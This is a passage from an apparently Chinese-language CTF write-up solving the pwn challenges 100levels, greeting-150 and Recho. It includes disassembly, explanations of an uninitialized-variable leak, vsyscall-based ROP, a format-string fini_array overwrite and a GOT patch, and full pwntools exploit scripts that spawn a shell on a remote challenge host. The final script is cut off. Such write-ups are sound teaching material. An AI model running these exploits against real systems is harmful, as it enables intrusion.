<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000D06 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D06                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D07                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D0A                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">110h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D11                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:system_ptr</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D18                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_110], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D1F                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, unk_20208C</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D26                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D28                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D2A                 <span class="keyword">jz</span>      short loc_D57</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D2C                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+var_110]</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D33                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rbp</span>+var_110]</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D3A                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rdx</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D3E                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D41                 <span class="keyword">lea</span>     <span class="built_in">rsi</span>, aHintP     <span class="comment">; "Hint: %p\n"</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D48                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rcx</span>        <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D4B                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000000D50                 <span class="keyword">call</span>    _sprintf</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D55                 <span class="keyword">jmp</span>     short loc_D7C</span><br></pre></td></tr></table></figure>

<p>可以看到<code>system_ptr</code>的值最后被存到了<code>[rbp+var_110]</code>里</p>
<p>因为子函数的 rbp 同主函数的 rbp，所以在 go 对应的<code>sub_B94</code>函数中，rbp 也是一样的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B94</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many levels?"</span>);</span><br><span class="line">  v2 = sub_B00();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">    v5 = v2;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</span><br><span class="line">  v3 = sub_B00();</span><br><span class="line">  v6 = v5 + v3;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You are being a real man."</span>);</span><br><span class="line">      v7 = <span class="number">100L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</span><br><span class="line">    v4 = time(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( sub_E43(v7) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = time(<span class="number">0L</span>L);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v8, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v7, (v1 - v4), v3);</span><br><span class="line">      <span class="built_in">puts</span>(&amp;v8);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Coward Coward Coward Coward Coward"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们分析这个函数，v5 所在的地址正是之前被赋值<code>system_ptr</code>的地址，这里是一个未初始化漏洞</p>
<p>在 v2 小于等于 0 时，v5 不会被赋值；接下来输入的 v3 的值会被加到 v5 所对应的值上，那么假如你输入的 v3 是 1，最后 v5 的值就会是<code>system + 1</code></p>
<p>我们可以利用这个函数来泄露<code>system</code>的地址，思路就是 v5 加上你输入的值是否会小于 0，这里没有等于是因为有数值范围</p>
<p>假使小于 0，就会输出<code>Coward Coward Coward Coward Coward</code>，然后转到菜单，继续进入 go 对应的<code>sub_B94</code>函数进行爆破</p>
<p>如果大于 0，那么就把第一次大于 0 的数保存到爆破的地址中，利用溢出将 ret 改为栈中存放的<code>start</code>函数地址恢复栈空间，继续爆破下一位</p>
<p>经过 gdb 调试，能够确定爆破范围为<code>0x7fXXXXXXX390</code>，要注意最后在<code>0xX390</code>时，v5 与 v3 相加得 0 也会输出<code>Coward Coward Coward Coward Coward</code>，所以需要加回 0x1000</p>
<p>接下来就是如何才能构造 rop 的问题了，一开始我们不知道任何函数的偏移量，如何覆盖到 start 函数使程序循环运行，这就用到了<code>vsyscall</code></p>
<p>vsyscall 的地址始终是固定的，不会受 ASLR 影响。这三个函数都带有 ret，我们可以利用它一步步将 rsp 移动到高地址</p>
<p><strong>vsyscall 基地址：0xffffffffff600000</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define VSYSCALL_ADDR_vgettimeofday   <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffffff600000</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="number">0x60</span></span><br><span class="line"><span class="number">0xffffffffff600007</span>    <span class="keyword">syscall</span> </span><br><span class="line"><span class="number">0xffffffffff600009</span>    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define VSYSCALL_ADDR_vtime           <span class="number">0xffffffffff600400</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffffff600400</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="number">0xc9</span></span><br><span class="line"><span class="number">0xffffffffff600407</span>    <span class="keyword">syscall</span> </span><br><span class="line"><span class="number">0xffffffffff600409</span>    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define VSYSCALL_ADDR_vgetcpu          <span class="number">0xffffffffff600800</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffffff600800</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="number">0x135</span></span><br><span class="line"><span class="number">0xffffffffff600807</span>    <span class="keyword">syscall</span> </span><br><span class="line"><span class="number">0xffffffffff600809</span>    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>随便选一个地址就行，用 gdb 调试算出任意一个能跳到 start 函数所需<code>覆盖为 vsyscall 函数地址的数目</code>即可</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="amd64", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./100levels'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">39340</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./100levels'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0xF45)" + "\nc" * 99)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *$rebase(0x102)\nc")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Question: '</span>)</span><br><span class="line">    num1 = int(p.recvuntil(<span class="string">' '</span>)[: <span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'* '</span>)</span><br><span class="line">    num2 = int(p.recvuntil(<span class="string">' '</span>)[: <span class="number">-1</span>])</span><br><span class="line">    p.sendafter(<span class="string">'Answer:'</span>, str(num1 * num2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(addr)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Choice:\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Choice:\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'How many levels?\n'</span>, <span class="string">'0'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Any more?\n'</span>, str(-addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_system_start = <span class="number">0x7f0000000390</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, <span class="number">2</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        addr_system_tmp = addr_system_start + (<span class="number">1</span> &lt;&lt; (i * <span class="number">4</span>)) * j</span><br><span class="line">        brute_force(addr_system_tmp)</span><br><span class="line">        tmp = p.recv(<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Coward Coward'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">            addr_system_start = addr_system_tmp</span><br><span class="line">            info(<span class="string">'addr_system_start = '</span> + hex(addr_system_start))</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">99</span>):</span><br><span class="line">                answer()</span><br><span class="line">            pd = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">            pd += p64(<span class="number">0xffffffffff600000</span>) * <span class="number">28</span></span><br><span class="line">            p.sendafter(<span class="string">'Answer:'</span>, pd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">addr_system = addr_system_start + <span class="number">0x1000</span></span><br><span class="line">libcbase = addr_system - libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr_rdi_ret = libcbase + <span class="number">0x21102</span></span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">p.sendafter(<span class="string">'Choice:\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendafter(<span class="string">'How many levels?\n'</span>, <span class="string">'0'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Any more?\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">success(<span class="string">'libcbase     = '</span> + hex(libcbase))</span><br><span class="line">success(<span class="string">'addr_rdi_ret = '</span> + hex(addr_rdi_ret))</span><br><span class="line">success(<span class="string">'addr_system  = '</span> + hex(addr_system))</span><br><span class="line">success(<span class="string">'addr_bin_sh  = '</span> + hex(addr_bin_sh))</span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">pd += p64(addr_rdi_ret)</span><br><span class="line">pd += p64(addr_bin_sh)</span><br><span class="line">pd += p64(addr_system)</span><br><span class="line">p.sendafter(<span class="string">'Answer:'</span>, pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h2><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution:"></a>Solution:</h3><p>格式化字符串的题，思路就是覆盖<code>fini_array</code>为<code>_start</code>函数地址来进行第二次利用</p>
<p>ps:<code>fini_array</code>只能令程序复原一次</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="i386", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./greeting-150'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">43647</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./greeting-150'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_strlen = <span class="number">0x8049a54</span></span><br><span class="line">plt_system = <span class="number">0x8048490</span></span><br><span class="line">addr_fini_array = <span class="number">0x8049934</span></span><br><span class="line">addr__start = <span class="number">0x80484f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x0804864F\nc\nsi\nb *0x08048677")</span></span><br><span class="line">pd = <span class="string">'aa'</span></span><br><span class="line">pd += p32(got_strlen)</span><br><span class="line">pd += p32(addr_fini_array)</span><br><span class="line">pd += p32(got_strlen + <span class="number">2</span>)</span><br><span class="line">pd += p32(got_strlen + <span class="number">3</span>)</span><br><span class="line">pd += <span class="string">'%33900d%12$hn'</span></span><br><span class="line">pd += <span class="string">'%96d%13$hn'</span></span><br><span class="line">pd += <span class="string">'%20d%14$hhn'</span></span><br><span class="line">pd += <span class="string">'%4d%15$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">'Please tell me your name... '</span>, pd)</span><br><span class="line">p.sendlineafter(<span class="string">'Please tell me your name... '</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">info(<span class="string">'len = '</span> + str(len(pd)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution:"></a>Solution:</h3><p>没给附件，在这先占个位置</p>
<hr>
<h3 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h2><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution:"></a>Solution:</h3><p>这题的难点在于这个循环如何结束，read 一直都是真，下面的方法可以让 read 返回 -1</p>
<p>如果是在 linux 终端上直接运行，我们可以用<code>Ctrl + D</code>，但是远程就无法处理这种信号，不过 pwntools 提供了一个 shutdown 功能，该功能可以关闭流</p>
<p>如果我们关闭输入流,这个循环就结束了，但是这样就不能够再次 ROP 到主函数获取输入，因为关闭后就不能打开，除非重新运行，所以必须一次性完成所有操作</p>
<p>然后列一下重要的做题点</p>
<p><strong>制造 syscall</strong></p>
<p>用 ROPgadget 是找不到 syscall 的，因为我们要自己构造</p>
<p>open、write、read、alarm 都是系统调用，这里没有用的就是 alarm 了，所以我们需要修改它的 got 表，让它的 plt 表变成 syscall</p>
<p>alarm 周边函数一览</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000000CC200</span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200 <span class="comment">; =============== S U B R O U T I N E =======================================</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200</span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200</span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200                 <span class="meta">public</span> alarm</span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200 alarm           proc <span class="built_in">near</span>               <span class="comment">; CODE XREF: lckpwdf+18E↓p</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200                                         <span class="comment">; lckpwdf+1D9↓p ...</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC200                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">25h</span> <span class="comment">; '%'</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC205                 <span class="keyword">syscall</span>                 <span class="comment">; LINUX - sys_alarm</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC207                 <span class="keyword">cmp</span>     <span class="built_in">rax</span>, <span class="number">0FFFFFFFFFFFFF001h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000CC20D                 <span class="keyword">jnb</span>     short loc_CC210</span><br><span class="line"><span class="symbol">.text:</span>00000000000CC20F                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>

<p>利用这个地址即可完成加 5 的修改</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000000040070d</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>

<p>原本想提权的，但是提权要两次利用 ROP emmmm</p>
<p><code>context.log_level = &#39;debug&#39;</code>需要开着，不然没法读返回的内容，我也不知道为啥</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./Recho'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">48200</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Recho'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">plt_alarm = elf.plt[<span class="string">'alarm'</span>]</span><br><span class="line">got_alarm = elf.got[<span class="string">'alarm'</span>]</span><br><span class="line">addr_bss = elf.bss()</span><br><span class="line">addr_rdi = <span class="number">0x4008a3</span></span><br><span class="line">addr_rax = <span class="number">0x4006fc</span></span><br><span class="line">addr_rsi_r15 = <span class="number">0x4008a1</span></span><br><span class="line">addr_rdx = <span class="number">0x4006fe</span></span><br><span class="line">addr_rop_1 = <span class="number">0x40070d</span>  <span class="comment"># add byte ptr [rdi], al ; ret</span></span><br><span class="line">addr_flag = <span class="number">0x601058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x400833\nb *0x4005f0\nc\nc")</span></span><br><span class="line"><span class="comment"># make syscall</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">pd += p64(addr_rdi)</span><br><span class="line">pd += p64(got_alarm)</span><br><span class="line">pd += p64(addr_rax)</span><br><span class="line">pd += p64(<span class="number">5</span>)</span><br><span class="line">pd += p64(addr_rop_1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make open</span></span><br><span class="line">pd += p64(addr_rsi_r15)</span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(addr_rdx)</span><br><span class="line">pd += p64(<span class="number">0</span>)</span><br><span class="line">pd 